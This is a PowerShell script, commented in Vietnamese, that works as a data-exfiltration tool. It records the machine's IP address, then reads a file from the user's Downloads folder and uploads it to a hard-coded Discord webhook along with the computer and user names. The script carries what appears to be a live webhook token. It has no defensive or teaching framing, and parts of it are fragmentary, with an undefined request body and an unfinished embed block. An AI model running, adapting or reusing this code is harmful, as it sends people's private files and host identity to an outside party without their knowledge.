$webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $test -ContentType "application/json"
    Write-Host "[+] Webhook test OK" -ForegroundColor Green

# --- Lấy IP (fallback) ---
try {
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
    Write-Host "[*] IP via Get-NetIPAddress: $ipAddress"
} catch {
    Write-Host "[!] Get-NetIPAddress failed, falling back to WMI..."
    $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
    Write-Host "[*] IP via WMI: $ipAddress"
}

# --- Gửi embed thông tin ---
$embedHash = @{

# --- Gửi file abc.txt với code đã hoạt động ---
$filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
Write-Host "[*] Checking file at: $filePath"

if (Test-Path $filePath) {
    $fileSize = (Get-Item $filePath).Length
    Write-Host "[*] File found. Size: $fileSize bytes" -ForegroundColor Cyan

    # Đảm bảo nạp thư viện .NET cần thiết (nếu chưa có)
    Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue

    try {
        # Khởi tạo HttpClient và MultipartFormDataContent
        $httpClient = [System.Net.Http.HttpClient]::new()
        $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

        # Đọc file dưới dạng mảng byte
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
        
        # Thêm file vào multipart với key "file" (Discord yêu cầu)
        $multipartContent.Add($fileContent, "file", "abc.txt")
        Write-Host "[*] Added file part with key 'file'" -ForegroundColor Gray

        # Thêm tin nhắn văn bản kèm theo (tùy chọn)
        $messageText = "Dữ liệu từ máy: $env:COMPUTERNAME - $env:USERNAME"
        $stringContent = [System.Net.Http.StringContent]::new($messageText)
        $multipartContent.Add($stringContent, "content")
        Write-Host "[*] Added message part with content: '$messageText'" -ForegroundColor Gray

        # Gửi POST request
        Write-Host "[*] Uploading file to Discord..." -ForegroundColor Yellow
        $response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result

        if ($response.IsSuccessStatusCode) {
            Write-Host "[+] File uploaded successfully!" -ForegroundColor Green
            # Đọc response (thường là rỗng)
            $responseBody = $response.Content.ReadAsStringAsync().Result
            if ($responseBody) {
                Write-Host "[*] Discord response: $responseBody" -ForegroundColor DarkGray
            }
        } else {
            $errorBody = $response.Content.ReadAsStringAsync().Result
            Write-Host "[-] Discord returned error: $($response.StatusCode) - $errorBody" -ForegroundColor Red
        }
    } catch {
        Write-Host "[-] Exception during upload: $($_.Exception.Message)" -ForegroundColor Red
        if ($_.Exception.InnerException) {
            Write-Host "    Inner: $($_.Exception.InnerException.Message)" -ForegroundColor Red
        }
    } finally {
        # Giải phóng tài nguyên
        if ($httpClient) { $httpClient.Dispose() }
        if ($multipartContent) { $multipartContent.Dispose() }
        Write-Host "[*] Cleanup completed." -ForegroundColor Gray
    }
} else {
    Write-Host "[!] File not found at $filePath" -ForegroundColor Red
}
